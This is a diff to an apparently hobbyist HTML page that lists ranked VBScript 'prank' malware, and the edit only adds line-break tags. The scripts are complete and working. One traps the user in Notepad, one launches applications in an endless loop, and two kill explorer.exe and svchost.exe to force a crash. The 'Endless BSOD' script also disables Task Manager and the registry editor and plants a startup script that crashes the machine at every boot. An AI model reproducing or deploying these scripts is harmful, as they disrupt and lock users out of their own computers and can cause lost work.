@@ -44,19 +44,19 @@
 <h1>Level 1 (Unopenable Notepad):</h1>
 <span class="code">
 Dim objShell, objWMIService, colProcesses<br>
-
+<br>
 Set objShell = CreateObject("WScript.Shell")<br>
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")<br>
-
+<br>
 Do<br>
     Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'notepad.exe'")<br>
-    
+    <br>
     If colProcesses.Count = 0 Then<br>
         objShell.Run "notepad", 1, True<br>
     Else<br>
         Dim hwnd<br>
         hwnd = objShell.AppActivate("Notepad")<br>
-        
+        <br>
         If hwnd Then<br>
             objShell.AppActivate "Notepad"<br>
         End If<br>
@@ -66,54 +66,56 @@ Loop<br>
 
 <h1>Level 2 (Application Bomber):</h1>
 <span class="code">
-Dim objShell
-Set objShell = CreateObject("WScript.Shell")
-
-Do
-    objShell.Run "winword"
-    objShell.Run "chrome"
-    objShell.Run "calc"
-    objShell.Run "mspaint"
-    objShell.Run "notepad"
-    objShell.Run "cmd"
-    objShell.Run "write"
-    objShell.Run "explorer"
-    objShell.Run "control"
-Loop
+Dim objShell<br>
+Set objShell = CreateObject("WScript.Shell")<br>
+<br>
+Do<br>
+    objShell.Run "winword"<br>
+    objShell.Run "chrome"<br>
+    objShell.Run "calc"<br>
+    objShell.Run "mspaint"<br>
+    objShell.Run "notepad"<br>
+    objShell.Run "cmd"<br>
+    objShell.Run "write"<br>
+    objShell.Run "explorer"<br>
+    objShell.Run "control"<br>
+Loop<br>
 </span>
 
 <h1>Level 5 (Command Prompt BSOD):</h1>
 <span class="code">
-Dim shell, I
-
-Set shell = CreateObject("WScript.Shell")
-
-shell.Run "taskkill /f /im explorer.exe"
-
-For I = 1 To 20
-    shell.Run "cmd"
-Next
-
-shell.Run "taskkill /f /im svchost.exe"</span>
+Dim shell, I<br>
+<br>
+Set shell = CreateObject("WScript.Shell")<br>
+<br>
+shell.Run "taskkill /f /im explorer.exe"<br>
+<br>
+For I = 1 To 20<br>
+    shell.Run "cmd"<br>
+Next<br>
+<br>
+shell.Run "taskkill /f /im svchost.exe"<br>
+</span>
 
 <h1>Level 15 (Endless BSOD):</h1>
-<span class="code">Dim shell, FSO
-
-Set shell = CreateObject("WScript.Shell")
-
-Set FSO = CreateObject("Scripting.FileSystemObject")
-
-shell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
-shell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f"
-
-Set OutPutFile = FSO.OpenTextFile(shell.SpecialFolders("Startup") & "\test.vbs", 8, True)
-
-OutPutFile.WriteLine "Dim shell"
-OutPutFile.WriteLine "Set shell = CreateObject(""WScript.Shell"")"
-OutPutFile.WriteLine "shell.Run """"taskkill /f /im svchost.exe"""""
-OutPutFile.Close
-
-Set FSO = Nothing
-shell.Run "taskkill /f /im svchost.exe"
+<span class="code">
+Dim shell, FSO<br>
+<br>
+Set shell = CreateObject("WScript.Shell")<br>
+<br>
+Set FSO = CreateObject("Scripting.FileSystemObject")<br>
+<br>
+shell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"<br>
+shell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f"<br>
+<br>
+Set OutPutFile = FSO.OpenTextFile(shell.SpecialFolders("Startup") & "\test.vbs", 8, True)<br>
+<br>
+OutPutFile.WriteLine "Dim shell"<br>
+OutPutFile.WriteLine "Set shell = CreateObject(""WScript.Shell"")"<br>
+OutPutFile.WriteLine "shell.Run """"taskkill /f /im svchost.exe"""""<br>
+OutPutFile.Close<br>
+<br>
+Set FSO = Nothing<br>
+shell.Run "taskkill /f /im svchost.exe"<br>
 </span>
 </center>
